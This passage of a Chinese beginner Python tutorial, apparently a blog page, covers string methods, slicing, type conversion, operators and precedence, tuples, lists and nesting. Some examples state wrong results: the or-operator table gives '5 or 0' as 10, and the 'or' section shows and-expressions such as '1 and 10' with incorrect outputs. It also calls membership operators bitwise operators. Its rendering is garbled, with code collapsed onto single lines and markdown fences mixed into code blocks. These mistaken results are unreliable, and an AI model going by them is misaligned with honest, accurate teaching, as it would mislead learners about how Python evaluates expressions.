<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查找内容存在时：text = &#x27;oldboy&#x27;index = text.find(&#x27;d&#x27;)  #查看d在字符串中的索引位置print(index)   #结果为2#如果查找内容不存在，默认返回 -1text = &#x27;oldboy&#x27;index = text.find(&#x27;a&#x27;)  #查看d在字符串中的索引位置，如果不存在，默认返回-1print(index)   #结果为：-1</span></span><br></pre></td></tr></table></figure></li>
<li><p>count()</p>
<ul>
<li>语法：a.count(‘好’)   #查看该字符在字符串里出现的次数</li>
<li>易错点：该方法不仅仅适用于字符串，也适用于列表、元组</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text = <span class="string">&#x27;好，狗屎，好了,好&#x27;</span>index = text.count(<span class="string">&#x27;好&#x27;</span>)  <span class="comment">#查看好在列表中出现的次数print(index)   #结果为3</span></span><br></pre></td></tr></table></figure></li>
<li><p>join</p>
<ul>
<li>语法：   ‘-‘.join(字符串)    #字符串里的每个字符用 - 连接起来</li>
<li>特性：接收参数必须为字符串</li>
</ul>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;oldboy&#x27;</span>  <span class="built_in">print</span>( <span class="string">&#x27;*&#x27;</span>.join(a) )  <span class="comment">#结果为：o*l*d*b*o*y    #错误做法  b = [1,2,3]  print(&#x27;&#x27;.join(b))  #报错：TypeError: sequence item 0: expected str instance, int found    #正确做法是先利用循环将列表全部转换为字符串 #方法一：  b = [1,2,3]  c = []  for i in b :      c.append(str(i))   print(&#x27;&#x27;.join(c))   #结果为 123    #方法二： a = [1,2,3] for index in range(0,len(a)) :     a[index] = str(a[index]) a = &#x27;_&#x27;.join(a) print(a)    #给[1,2,3,4]用下划线链接  a = [1, 2, 3, 4]  b = []  for i in a:      b.append(str(i))  b = &#x27;_&#x27;.join(b)  print(b)</span></span><br></pre></td></tr></table></figure></li>
<li><p>len()</p>
<ul>
<li>注意点：是计算字符的长度，并不是计算字符的大小</li>
</ul>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;我love你&#x27;</span><span class="built_in">print</span>(<span class="built_in">len</span>(a))  <span class="comment">#结果为6</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>索引、切片、步长</p>
<ul>
<li><p>注意点：</p>
<ul>
<li><p>a[0:4]  这里包含0，不包含4，所以这里切片的是索引为0，1，2，3这四个元素</p>
</li>
<li><p>索引可以是负数，a[-1]表示最后一个元素，a[-2]表示倒数第二个元素</p>
</li>
<li><p>步长如果不填，则默认为1，步长表示间隔，如果步长为正数，则从左到右取数据，如果步长为负数，则倒着取数据</p>
</li>
<li><p>字符串通过切片拼接成新的字符串：</p>
<p>利用字符串拼接符号 + 来实现</p>
</li>
</ul>
</li>
<li><p>实例1：</p>
</li>
</ul>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#索引a = &#x27;hello&#x27;b = a[1] print(b)     #结果为e#切片（索引为正）a = &#x27;hello&#x27;b = a[1:4] print(b)      #结果为ell#切片（索引为负）a = &#x27;hello&#x27;b = a[1:-2] print(b)      #结果为el#切片（步长为正数）a = &#x27;hello&#x27;b = a[::2] print(b)  #结果为hlo #切片（步长为负数）a = &#x27;hello&#x27;b = a[::-1] print(b)  #结果为olleh#切片（步长为负数）a = &#x27;hello&#x27;b = a[-1:1:-1]print(b)  #结果为oll#切片（拼接成新的字符串）s = &quot;123a4b5c&quot;s6 = s[5] + s[3] + s[1]print(s6)   #结果为ba2</span></span><br></pre></td></tr></table></figure>

<p> 实例2：利用步长实现倒着打印</p>
<ul>
<li><p>如果步长为负数，则切片就是从最后一个元素往第一个元素切片，如果没写步长，则默认是1</p>
</li>
<li><p>易错点：</p>
<ul>
<li><p>步长忘记写了，必须要写成负数</p>
<p><img src="https://gitee.com/python_road/python_img/raw/master/img/image-20200404132308361.png" alt="image-20200404132308361"></p>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="3-4-数据类型的转换"><a href="#3-4-数据类型的转换" class="headerlink" title="3.4 数据类型的转换"></a>3.4 数据类型的转换</h3><p>其他类型转布尔型：</p>
<ul>
<li>int里只有0是False，其余全部是True</li>
<li>str里只有空’’是False，其余全部是True</li>
<li>元组里只有空元组()是False，其余全部是True</li>
<li>列表里只有空列表[]是False，其余全部是True</li>
<li>字典里只有空字典{}是False，其余全部是True</li>
<li>集合里只有空集合set()是False，其余全部是True</li>
<li>None本身就是Flase</li>
</ul>
<p>布尔类型转整型：</p>
<ul>
<li>True可以转换为1</li>
<li>False可以转换为0</li>
</ul>
<p>整型int和字符串str互转</p>
<ul>
<li>整型转str：str(6)</li>
<li>str转整型：int(‘10’)     此处需要注意，必须要类似于数字的字符才能转整型，否则容易报错</li>
</ul>
<p>元组、列表、结合互转</p>
<ul>
<li><p>本质：相当于for循环待转换序列的每一个元素，然后将其添加到需要转换的序列</p>
</li>
<li><p>元组转列表、集合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(a))        <span class="comment"># 元组转列表，结果：[3, 4, 5]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(a))        <span class="comment"># 元组转集合，结果：&#123;3, 4, 5&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>列表转元组、集合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(a))        <span class="comment"># 列表转元组，结果：(3, 4, 5)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(a))        <span class="comment"># 列表转集合，结果：&#123;3, 4, 5&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p>集合转元组、列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = &#123;<span class="string">&#x27;张三&#x27;</span>,<span class="number">26</span>,<span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(a))        <span class="comment"># 结合转元组，结果：(26, &#x27;男&#x27;, &#x27;张三&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(a))        <span class="comment"># 集合转列表，结果：[26, &#x27;男&#x27;, &#x27;张三&#x27;]</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>特殊情况</p>
<ul>
<li>因为字典的结构特殊，所以其他数据类型无法转换成字典<ul>
<li>原因：因为序列转换的本质就是for循环，但是for循环字典得到的只是键，所以转换字典得到的只是键</li>
</ul>
</li>
<li>因为字典的结构特殊，所以字典转化为其他类型，转换的只是键，而没有值<ul>
<li>原因：因为序列转换的本质就是for循环，但是for循环字典得到的只是键，所以转换字典得到的只是键</li>
</ul>
</li>
<li>序列转化为str，结果还是一样，转没转都是一样</li>
</ul>
<h3 id="3-5-运算符及优先级"><a href="#3-5-运算符及优先级" class="headerlink" title="3.5 运算符及优先级"></a>3.5 运算符及优先级</h3><h4 id="3-5-1-运算符"><a href="#3-5-1-运算符" class="headerlink" title="3.5.1 运算符"></a>3.5.1 运算符</h4><h5 id="3-5-1-1-算术运算符"><a href="#3-5-1-1-算术运算符" class="headerlink" title="3.5.1.1 算术运算符"></a>3.5.1.1 算术运算符</h5><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">含义</th>
<th align="center">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td align="center">两个数相加</td>
<td align="center">2+1=3</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">两个数相减</td>
<td align="center">3-1=2</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">两个数相乘</td>
<td align="center">2*3=6</td>
</tr>
<tr>
<td align="center">/</td>
<td align="center">两个数相除</td>
<td align="center">4/2=2</td>
</tr>
<tr>
<td align="center">%</td>
<td align="center">求余数</td>
<td align="center">9%2=1</td>
</tr>
<tr>
<td align="center">//</td>
<td align="center">整除</td>
<td align="center">5//2=2</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center">幂运算</td>
<td align="center">3**2=9</td>
</tr>
</tbody></table>
<h5 id="3-5-1-2-逻辑运算符"><a href="#3-5-1-2-逻辑运算符" class="headerlink" title="3.5.1.2 逻辑运算符"></a>3.5.1.2 逻辑运算符</h5><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">含义</th>
<th align="center">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&gt;</td>
<td align="center">大于</td>
<td align="center">3 &gt; 2</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">小于</td>
<td align="center">4 &lt; 5</td>
</tr>
<tr>
<td align="center">&gt;=</td>
<td align="center">大于等于</td>
<td align="center">3 &gt;= 1</td>
</tr>
<tr>
<td align="center">&lt;=</td>
<td align="center">小于等于</td>
<td align="center">2 &lt;= 5</td>
</tr>
<tr>
<td align="center">!=</td>
<td align="center">不等于</td>
<td align="center">2 != 3</td>
</tr>
<tr>
<td align="center">==</td>
<td align="center">等于</td>
<td align="center">3 == 3</td>
</tr>
</tbody></table>
<h5 id="3-5-1-3-赋值运算符"><a href="#3-5-1-3-赋值运算符" class="headerlink" title="3.5.1.3 赋值运算符"></a>3.5.1.3 赋值运算符</h5><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">=</td>
<td align="center">赋值，</td>
</tr>
<tr>
<td align="center">+=</td>
<td align="center">c += 1 等价于 c = c + 1</td>
</tr>
<tr>
<td align="center">-=</td>
<td align="center">c -= 1 等价于 c = c - 1</td>
</tr>
<tr>
<td align="center">*=</td>
<td align="center">c *= 1 等价于 c = c * 1</td>
</tr>
<tr>
<td align="center">/=</td>
<td align="center">c /= 1 等价于 c = c / 1</td>
</tr>
<tr>
<td align="center">**=</td>
<td align="center">c  **=  2 等价于 c = c *c</td>
</tr>
<tr>
<td align="center">//=</td>
<td align="center">c //= 2 等价于 c = c // 2</td>
</tr>
<tr>
<td align="center">%=</td>
<td align="center">c %= 2等价于 c = c % 2</td>
</tr>
</tbody></table>
<h5 id="3-5-1-3-逻辑运算符"><a href="#3-5-1-3-逻辑运算符" class="headerlink" title="3.5.1.3 逻辑运算符"></a>3.5.1.3 逻辑运算符</h5><table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
<th align="center">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">and</td>
<td align="center">如果a是真，则结果取决于b；如果a是假，则结果取决于a</td>
<td align="center">10 and 0 ，结果是0；0 and 10 ，结果是0</td>
</tr>
<tr>
<td align="center">or</td>
<td align="center">如果a是真，则结果取决于a；如果a是假，则结果取决于b</td>
<td align="center">5 or 0，结果是10；0 or 5，结果是5</td>
</tr>
<tr>
<td align="center">not</td>
<td align="center">取反运算</td>
<td align="center">not 10,结果是False；not False，结果是True</td>
</tr>
</tbody></table>
<h5 id="3-5-1-4-位运算符"><a href="#3-5-1-4-位运算符" class="headerlink" title="3.5.1.4 位运算符"></a>3.5.1.4 位运算符</h5><p>含义：判断一个东西是否是另一个东西的子序列（判断一个东西是否在另外一个东西里），返回结果为True或者False</p>
<table>
<thead>
<tr>
<th align="center">运算符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">in</td>
<td align="center">a in b：如果a在b的序列里，则返回True；否则返回False</td>
</tr>
<tr>
<td align="center">not in</td>
<td align="center">a not in b：如果a不在b的序列里，则返回True；否则返回False</td>
</tr>
</tbody></table>
<p>实例：</p>
<ul>
<li><p>```python<br>text = ‘张三，李四，王麻子’<br>print(‘李四’ in text)   #返回结果是True</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### 3.5.1.5 运算符优先级</span><br><span class="line"></span><br><span class="line">从最高往下排：</span><br><span class="line"></span><br><span class="line">| **                       | 指数 (最高优先级)                                      |</span><br><span class="line">| ------------------------ | ------------------------------------------------------ |</span><br><span class="line">| ~ + -                    | 按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@) |</span><br><span class="line">| * / % //                 | 乘，除，取模和取整除                                   |</span><br><span class="line">| + -                      | 加法减法                                               |</span><br><span class="line">| &gt;&gt; &lt;&lt;                    | 右移，左移运算符                                       |</span><br><span class="line">| &amp;                        | 位 &#x27;AND&#x27;                                               |</span><br><span class="line">| ^ \|                     | 位运算符                                               |</span><br><span class="line">| &lt;= &lt; &gt; &gt;=                | 比较运算符                                             |</span><br><span class="line">| &lt;&gt; == !=                 | 等于运算符                                             |</span><br><span class="line">| = %= /= //= -= += *= **= | 赋值运算符                                             |</span><br><span class="line">| is is not                | 身份运算符                                             |</span><br><span class="line">| in not in                | 成员运算符                                             |</span><br><span class="line">| not and or               | 逻辑运算符                                             |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 3.5.2 判别优先级（结合实例）</span><br><span class="line"></span><br><span class="line">##### 3.5.2.1 组合：数字、or、and</span><br><span class="line"></span><br><span class="line">判别方法：</span><br><span class="line"></span><br><span class="line">- A and B：如果A为真，则结果看B；如果A为假，则结果为A</span><br><span class="line">- A  or   B :如果A为真，则结果看A；如果A为假，则结果看B</span><br><span class="line">- 如果判别的表达式很多很复杂，都糅合在一起了，那么我们可以根据优先级来将该语句进行拆分，可借助括号括起来，更直观明了，接着再利用同级别从左到右的规则，进行判别</span><br><span class="line"></span><br><span class="line">易错点：A和B可以是表达式：例如：3&gt;2等</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line"></span><br><span class="line">- and</span><br><span class="line">  - 如果第一个数为假，那么最终结果参考第一个数；</span><br><span class="line">  - 如果一个数为真，那么最终结果参考第二个数</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">print( 0 and 5 )   #第一个数为假</span><br><span class="line">#结果为：0</span><br><span class="line"></span><br><span class="line">print( 5 and 0 )   #第一个数为真</span><br><span class="line">#结果为：0</span><br><span class="line"></span><br><span class="line">print( 5 and 10 )   #第一个数为真</span><br><span class="line">#结果为：10</span><br></pre></td></tr></table></figure></li>
<li><p>or</p>
<ul>
<li><p>如果第一个数为真，那么最终结果参考第一个数</p>
</li>
<li><p>如果第一个数为假，那么最终结果参考第二个数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>( <span class="number">1</span> <span class="keyword">and</span> <span class="number">10</span>)  </span><br><span class="line"><span class="comment">#结果为1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>( <span class="number">0</span> <span class="keyword">and</span> <span class="number">10</span>)</span><br><span class="line"><span class="comment">#结果为10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h5 id="3-5-2-2-组合：not-or-and"><a href="#3-5-2-2-组合：not-or-and" class="headerlink" title="3.5.2.2 组合：not,or,and,()"></a>3.5.2.2 组合：not,or,and,()</h5><p>优先级：</p>
<ul>
<li>()   &gt;    not  &gt;  and  &gt;  or  </li>
</ul>
<p>判别方法：</p>
<ul>
<li><p>类似于下面的例子，表达式很长、很复杂，那么就根据优先级来进行拆分，可以借助括号来进行括起来，然后根据同级从左到右的方法来进行判别<br>1 &gt; 1 or 3 &lt; 4 or 4 &gt; 5 and 2 &gt; 1 and 9 &gt; 8 or 7 &lt; 6                #结果为true</p>
</li>
<li><p>and的优先级高于or，所以先将and的左右两边元素挑出来，如果有多个同级的，例如这里多个and，那么根据从左到右的原则进行拆分，可以转换为：</p>
<p>1 &gt; 1 or 3 &lt; 4 or        (  (4 &gt; 5 and 2 &gt; 1)      and  (9 &gt; 8)   )           or 7 &lt; 6 </p>
</li>
<li><p>接着提取or</p>
<p>（1 &gt; 1） or （3 &lt; 4） or       (    (4 &gt; 5 and 2 &gt; 1)     and   (9 &gt; 8)    )          or  （7 &lt; 6） </p>
</li>
<li><p>接下来就可以比较了，结果为True</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">not</span> <span class="number">2</span> &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="number">3</span> &lt; <span class="number">4</span>       <span class="keyword">or</span>      <span class="number">4</span> &gt; <span class="number">5</span> <span class="keyword">and</span> <span class="number">2</span> &gt; <span class="number">1</span>     <span class="keyword">and</span> <span class="number">9</span> &gt; <span class="number">8</span>    <span class="keyword">or</span> <span class="number">7</span> &lt; <span class="number">6</span>       <span class="comment">#结果为false</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">or</span>      <span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span>        <span class="keyword">or</span>      <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span>       <span class="keyword">or</span>       <span class="number">9</span> <span class="keyword">and</span> <span class="number">7</span>     <span class="comment">#结果为8</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">or</span>        <span class="number">2</span> <span class="keyword">and</span> <span class="number">3</span>      <span class="keyword">and</span>      <span class="number">4</span>      <span class="keyword">or</span>       <span class="number">6</span> <span class="keyword">and</span> <span class="number">0</span>      <span class="keyword">or</span> <span class="number">3</span>     <span class="comment">#结果为4</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">or</span> <span class="number">2</span> &gt; <span class="number">1</span>        <span class="comment">#结果为  6</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">or</span> <span class="number">2</span> &gt; <span class="number">1</span>        <span class="comment">#结果为3</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">or</span> <span class="number">5</span> &lt; <span class="number">4</span>   	  <span class="comment">#结果为false</span></span><br><span class="line"><span class="number">5</span> &lt; <span class="number">4</span> <span class="keyword">or</span> <span class="number">3</span>        <span class="comment">#结果为3</span></span><br><span class="line"><span class="number">2</span> &gt; <span class="number">1</span> <span class="keyword">or</span> <span class="number">6</span>     	  <span class="comment">#结果为true</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">and</span> <span class="number">2</span> &gt; <span class="number">1</span>       <span class="comment">#结果为true</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">and</span> <span class="number">3</span> &gt; <span class="number">1</span>       <span class="comment">#结果为0</span></span><br><span class="line"><span class="number">2</span> &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="number">3</span>       <span class="comment">#结果为3</span></span><br><span class="line"><span class="number">3</span> &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span>       <span class="comment">#结果为0</span></span><br><span class="line"><span class="number">3</span> &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>     <span class="keyword">or</span>      <span class="number">2</span> &lt; <span class="number">3</span> <span class="keyword">and</span> <span class="number">3</span>     <span class="keyword">and</span> <span class="number">4</span>      <span class="keyword">or</span>    <span class="number">3</span> &gt; <span class="number">2</span>      <span class="comment">#结果为2</span></span><br></pre></td></tr></table></figure>



<h3 id="3-6-元组-tuple-、列表"><a href="#3-6-元组-tuple-、列表" class="headerlink" title="3.6 元组(tuple)、列表"></a>3.6 元组(tuple)、列表</h3><h4 id="3-6-1-元组"><a href="#3-6-1-元组" class="headerlink" title="3.6.1 元组"></a>3.6.1 元组</h4><p>表现形式：数据用小括号括起来，中间用逗号隔开</p>
<p>特性：静态的，不可变类型</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = (<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="number">66</span>)</span><br></pre></td></tr></table></figure>

<p>方法：类似于字符串，方法少于列表，没有增加、修改、删除的方法，静态的，不可变，即元组和字符串通过函数操作，其本身的值（内部元素）并不会改变</p>
<ul>
<li>索引</li>
<li>切片</li>
<li>步长</li>
</ul>
<h4 id="3-6-2-列表"><a href="#3-6-2-列表" class="headerlink" title="3.6.2 列表"></a>3.6.2 列表</h4><p>表现形式：数据用中括号括起来，中间用逗号隔开</p>
<p>特性：可变类型，会对原列表数据进行修改</p>
<p>方法：</p>
<ul>
<li><p>增</p>
<ul>
<li>append()：在最后作为一个整体添加</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">extend():相当于两个列表的合并</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">```python</span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">a.append(b)</span><br><span class="line"><span class="built_in">print</span>(a)   <span class="comment">#结果为[1,2,3,[4,5,6]]  b是作为一个整体加入到a中了，相当于列表a的一个元素</span></span><br><span class="line"></span><br><span class="line">c = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">d = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">c.extend(d)</span><br><span class="line"><span class="built_in">print</span>(c)    <span class="comment">#结果为[1,2,3,4,5,6] ,d中的每一个元素都加到列表a中了，相当于两个列表的合并</span></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">- insert()：插入，接收参数为索引值</span><br></pre></td></tr></table></figure>

<ul>
<li><p>删</p>
<ul>
<li><p>del和pop的区别</p>
<ul>
<li><p>del  只是单纯的删除</p>
</li>
<li><p>pop   不仅删除，如果将还会提取出删除的内容，语句赋值给变量，那么该变量的内容就是删除的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b = a.pop(<span class="number">1</span>)  <span class="comment">#此时将删掉的索引1所代表的的值2赋值给了变量b</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>```python<br>del a[0]<br>remove()：删除，以内容为依据<br>pop():删除，以索引为依据<br>clear():清空列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">- 改</span><br><span class="line"></span><br><span class="line">  - 索引提取然后重新赋值</span><br><span class="line">    - a[0] = &#x27;666&#x27;</span><br><span class="line"></span><br><span class="line">- 查</span><br><span class="line"></span><br><span class="line">  - 索引、切片查看</span><br><span class="line">    - a[0]</span><br><span class="line">    - a[0:3]</span><br><span class="line"></span><br><span class="line">- 列表反转：reverse</span><br><span class="line"></span><br><span class="line">  - 通过方法reverse来反转</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    a = [1,2,3,4]</span><br><span class="line">    a.reverse()   #反转方法</span><br><span class="line">    print(a)</span><br></pre></td></tr></table></figure></li>
<li><p>列表排序:sort()</p>
<ul>
<li><p>从小到大排序（默认）,默认时，reverse = False</p>
</li>
<li><p>从大到小排序，需指定参数reverse = True</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#不指定sort参数，就是默认排序，默认就相当于reverse = False即从小到大排序</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">0</span>]</span><br><span class="line">a.sort()</span><br><span class="line"><span class="built_in">print</span>(a)            <span class="comment">#结果为：[0, 1, 3, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定参数排序,reverse = True ,相当于开启反转，那么就是从大到小了</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">0</span>]</span><br><span class="line">a.sort(reverse = <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(a)            <span class="comment">#结果为：[5, 3, 1, 0]</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="3-6-3-元组、列表、字符串区别"><a href="#3-6-3-元组、列表、字符串区别" class="headerlink" title="3.6.3 元组、列表、字符串区别"></a>3.6.3 元组、列表、字符串区别</h4><p>方法种类对比：</p>
<ul>
<li><p>列表：</p>
<ul>
<li>方法最多，有增加、修改、删除的方法</li>
</ul>
</li>
<li><p>字符串和元组：</p>
<ul>
<li>方法少于列表，没有增加、修改、删除的方法</li>
</ul>
</li>
</ul>
<p>本身特性对比：</p>
<ul>
<li><p>列表：</p>
<ul>
<li>动态的，可变的，即其内部各个元素可以改变，也就是可以修改，删除，增加</li>
</ul>
</li>
<li><p>元组、字符串：</p>
<ul>
<li>静态的，不可变，即元组和字符串通过函数操作，其本身的值（内部元素）并不会改变</li>
</ul>
</li>
<li><p>静态的解决办法：</p>
<ul>
<li>首先用方法进行操作，然后将操作后的结果赋值给新的变量即可</li>
</ul>
</li>
</ul>
<h4 id="3-6-4-for与字符串、元组、列表的组合"><a href="#3-6-4-for与字符串、元组、列表的组合" class="headerlink" title="3.6.4 for与字符串、元组、列表的组合"></a>3.6.4 for与字符串、元组、列表的组合</h4><p>与for组合的作用：</p>
<ul>
<li>遍历每一个元素，如果是字符串的话，就相当于遍历该字符串的每一个字符</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字符串搭配for</span></span><br><span class="line">a = <span class="string">&#x27;oldboy&#x27;</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> a :</span><br><span class="line">    <span class="built_in">print</span>(index)</span><br><span class="line"> <span class="comment">#结果是：打印（遍历）出字符串的每一个元素，意思就是打印出了每一个字符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#元组搭配for</span></span><br><span class="line">a = (<span class="number">66</span>,<span class="string">&#x27;无语&#x27;</span>,<span class="number">89</span>)</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> a :</span><br><span class="line">    <span class="built_in">print</span>(index)</span><br><span class="line"><span class="comment">#将元组的每一个元素打印出来了，66，无语，99   这几个元素，一个元素占一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#列表搭配for</span></span><br><span class="line">a = [<span class="number">66</span>,<span class="string">&#x27;测试&#x27;</span>,<span class="number">9654</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> a :</span><br><span class="line">    <span class="built_in">print</span>(index)</span><br><span class="line"><span class="comment">#结果是：打印出了每一个元素</span></span><br></pre></td></tr></table></figure>



<h4 id="3-6-5-列表、元组、字符串的互相嵌套"><a href="#3-6-5-列表、元组、字符串的互相嵌套" class="headerlink" title="3.6.5 列表、元组、字符串的互相嵌套"></a>3.6.5 列表、元组、字符串的互相嵌套</h4><p>语句嵌套：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#列表和字符串嵌套a = [66,&#x27;ljdflj&#x27;,&#x27;张三&#x27;]#列表、字符串、元组混合嵌套a = [36,(&#x27;老男孩&#x27;,26,&#x27;ljdlf&#x27;),]</span></span><br></pre></td></tr></table></figure>

<p>读取、取值：嵌套取值</p>
<ul>
<li>方法：一层一层的取，按照没嵌套的时候的索引取值的方法取值，然后再在后面加索引进行嵌套取值</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#例如：a[1][1][2]     有几重嵌套就加几个索引来取值#列表和字符串嵌套，2重嵌套a = [66,&#x27;ljdflj&#x27;,&#x27;张三&#x27;]print(a[1][1])    #结果为j,取列表的第2个元素里面的第二个元素，这是2重嵌套，所以要2重取值#列表、字符串、元组混合嵌套,3重嵌套a = [36,(&#x27;老男孩&#x27;,26,&#x27;ljdlf&#x27;),&#x27;测试&#x27;]print(a[1][0][1])    #取值结果为 男    这是3重嵌套，所以要3重取值</span></span><br></pre></td></tr></table></figure>

<p>修改、增加：修改嵌套语句里的数据</p>
<ul>
<li>易错点和注意点：<ul>
<li>列表属于可变类型，所以他的直属元素是可以修改的（新增、删除、修改），但是仅限于该列表直属元素，深度只是为1，该规则不适用于更深层次的元素</li>
<li>字符串、元组属于静态类型，所以它的元素无法修改，但是这仅仅限于深度1，也就是该字符串、元组的直属元素无法修改，如果它有个元素是列表，那么该列表里面的元素是可以修改的</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#列表和字符串嵌套a = [66,&#x27;ljdflj&#x27;,&#x27;张三&#x27;]a.pop(1)       #可以对列表a的直属元素进行修改，此处删除了ljdfljprint(a)b = (36,[&#x27;老男孩&#x27;,26,&#x27;ljdlf&#x27;],&#x27;测试&#x27;)#b.pop(1)   错误语句，因为元组和字符串的直属元素是无法修改的b[1].pop(0)    &#x27;&#x27;&#x27;此处删除了&#x27;老男孩&#x27;，那么为什么这里可以删除呢？因为元组、字符串的特性：无法修改它的直属元素，这里的[&#x27;老男孩&#x27;,26,&#x27;ljdlf&#x27;]作为一个整体，属于元组的直属元素，所以它这个整体无法改变但是这个元素又是一个列表，这个列表里的元素能不能修改取决于这个列表，很明显，列表的特性：它的直属元素可以修改，所以我们完全可以通过索引来定位到那个列表：这里就是b[1]，b[1]是元组的一个元素，同时也是一个列表，那么像修改该列表里的元素，只需要:b[1].pop[0]即可&#x27;&#x27;&#x27;print(b)</span></span><br></pre></td></tr></table></figure>

